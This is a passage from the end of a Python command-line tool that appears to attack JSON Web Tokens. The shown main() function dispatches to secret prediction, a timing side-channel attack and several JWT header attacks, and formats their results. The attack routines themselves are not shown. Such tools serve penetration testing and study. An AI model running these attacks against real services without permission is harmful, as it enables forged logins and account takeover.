        decoded = JWTDecoder.decode(args.predict)
        pred = SecretPredictor.predict_from_token(args.predict, decoded)
        if args.json:
            print(json.dumps(pred, indent=2) if pred else '{"error": "no prediction"}')
        else:
            if pred:
                print(f"\n  Secret Prediction: {pred.get('assessment', 'N/A')}")
                print(f"  Likely type: {pred.get('type', 'N/A')}")
            else:
                print("  Not an HMAC algorithm — no secret prediction available")
        return

    # Timing attack
    if args.timing:
        result = cracker.timing_attack(args.timing, alg=args.alg)
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print(f"\n{'='*60}")
            print(f"  TIMING SIDE-CHANNEL ANALYSIS")
            print(f"{'='*60}")
            print(f"  Baseline avg: {result.get('baseline_avg_ms')}ms")
            print(f"\n  {'Length':>8} {'Avg(ms)':>12} {'Dev(ms)':>12}")
            print(f"  {'-'*35}")
            for length in sorted(result.get("length_analysis", {}).keys()):
                la = result["length_analysis"][length]
                print(f"  {length:>8} {la['avg_ms']:>12.3f} {la['deviation_ms']:>12.3f}")
            suspects = result.get("suspect_lengths", [])
            if suspects:
                print(f"\n  Suspect lengths: {suspects}")
        return

    # All header attacks
    if args.headers:
        results = headers.multiple_header_attacks(args.headers)
        if args.json:
            print(json.dumps(results, indent=2, default=str))
        else:
            print(f"\n{'='*60}")
            print(f"  JWT HEADER ATTACKS")
            print(f"{'='*60}")
            for r in results:
                status = "[+]" if r["applicable"] else "[-]"
                print(f"  {status} {r['attack']}: {'APPLICABLE' if r['applicable'] else 'N/A'}")
                if r.get("hint"):
                    print(f"      Hint: {r['hint']}")
                if r.get("result") and r["result"] != r.get("hint"):
                    print(f"      Result: {r['result'][:100]}")
        return

    parser.print_help()


if __name__ == "__main__":
    main()
